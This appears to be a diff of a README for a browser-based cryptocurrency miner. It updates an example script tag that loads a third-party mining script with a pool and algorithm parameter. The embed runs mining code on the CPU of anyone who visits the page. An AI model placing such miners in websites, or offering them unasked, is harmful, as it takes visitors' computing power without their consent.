@@ -17,7 +17,7 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumoko
 ```
 #### Examples: CN V8 Coins with custom POW (Graft coming soon) need ?algo=cn/3<br> 
 ```sh
-<script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/2?jason=Your_Favorite_Pool:PortNr" > </script>
+<script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/3?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
 #### Examples: CN V7 Coins (MoneroV) need ?algo=cn/1<br> 
 ```sh
